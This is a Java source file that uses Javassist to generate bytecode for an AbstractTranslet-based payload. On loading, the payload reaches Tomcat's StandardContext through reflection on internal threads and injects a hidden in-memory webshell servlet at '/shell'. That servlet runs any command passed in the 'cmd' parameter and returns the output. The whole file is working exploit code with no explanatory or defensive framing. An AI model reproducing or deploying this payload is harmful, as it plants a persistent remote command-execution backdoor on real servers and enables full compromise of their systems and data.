import javassist.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Servlet8Echo{

    static public byte[] getCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        ctClass.addInterface(pool.get(javax.servlet.Servlet.class.getName()));
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();

        CtMethod ctMethod = CtNewMethod.make("public void init(javax.servlet.ServletConfig servletConfig)  {}", ctClass);
        ctClass.addMethod(ctMethod);

        ctMethod = CtNewMethod.make("" +
                "    public void service(javax.servlet.ServletRequest req, javax.servlet.ServletResponse resp){\n" +
                "        try {\n" +
                "            resp.setContentType(\"text/html;charset=UTF-8\");\n" +
                "            Process process = Runtime.getRuntime().exec(req.getParameter(\"cmd\"));\n" +
                "            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n" +
                "            String line = null;\n" +
                "            while ((line = reader.readLine()) != null) {\n" +
                "                resp.getWriter().print(line + '\\n');\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(ctMethod);

        ctMethod = CtNewMethod.make("public void destroy() {}", ctClass);
        ctClass.addMethod(ctMethod);

        ctMethod = CtNewMethod.make("" +
                "    static public Object getField(Object obj, String fName) throws Exception{\n" +
                "        java.lang.reflect.Field f = obj.getClass().getDeclaredField(fName);\n" +
                "        f.setAccessible(true);\n" +
                "        Object o = f.get(obj);\n" +
                "        return o;\n" +
                "    }", ctClass);
        ctClass.addMethod(ctMethod);

        constructor.setBody("{" +
                "            // 从线程中获取 org.apache.catalina.connector.Request\n" +
                "            java.lang.reflect.Field f = null;\n" +
                "\n" +
                "            Object threadGroup = Thread.currentThread().getThreadGroup();\n" +
                "\n" +
                "            Thread[] threads = (Thread[]) getField(threadGroup, \"threads\");\n" +
                "\n" +
                "            Thread thread = null;\n" +
                "            // 跟 Tomcat9 的区别之处\n" +
                "            for (int i = 0; i < threads.length; i++) {\n" +
                "                if (threads[i].toString().contains(\"Acceptor\")) {\n" +
                "                    thread = threads[i];\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "\n" +
                "            Object nioEndpoint = getField(getField(thread, \"target\"), \"this$0\");\n" +
                "\n" +
                "            f = nioEndpoint.getClass().getDeclaredField(\"handler\");\n" +
                "            f.setAccessible(true);\n" +
                "            org.apache.tomcat.util.net.AprEndpoint.Handler handler =  (org.apache.tomcat.util.net.AprEndpoint.Handler) f.get(nioEndpoint);\n" +
                "\n" +
                "            java.util.List processors = (java.util.List) getField(handler.getGlobal(), \"processors\");\n" +
                "\n" +
                "            org.apache.catalina.connector.Request request = null;\n" +
                "\n" +
                "            for (int i = 0; i < processors.size(); i++) {\n" +
                "                Object requestInfo = processors.get(i);\n" +
                "                Object requestTmp = getField(requestInfo, \"req\");\n" +
                "                Object[] nodes = (Object[]) getField(requestTmp, \"notes\");\n" +
                "                for (int y = 0; y < nodes.length; y++) {\n" +
                "                    if (nodes[y] instanceof org.apache.catalina.connector.Request) {\n" +
                "                        request = (org.apache.catalina.connector.Request) nodes[y];\n" +
                "                        break;\n" +
                "                    }\n" +
                "                }\n" +
                "                if (request.getSession() != null) {break;}\n" +
                "            }\n" +
                "\n" +
                "            //获取 standardContext\n" +
                "            Object servletContext = request.getSession().getServletContext();\n" +
                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getField(getField(servletContext, \"context\"), \"context\");\n" +
                "\n" +
                "            //创建恶意Servlet\n" +
                "            javax.servlet.Servlet servlet = i.class.newInstance();\n" +
                "\n" +
                "            //注入恶意Servlet\n" +
                "            String name = \"shell\";\n" +
                "            org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();\n" +
                "            wrapper.setName(name);\n" +
                "            wrapper.setServlet(servlet);\n" +
                "            wrapper.setLoadOnStartup(1);\n" +
                "            wrapper.setServletClass(servlet.getClass().getName());\n" +
                "            standardContext.addChild(wrapper);\n" +
                "            standardContext.addServletMapping(\"/shell\",name);\n" +
                "\n" +
                "            request.getResponse().getWriter().print(\"Inject Success!\");" +
                "}");

        byte[] bytes = ctClass.toBytecode();
        return bytes;
    }
}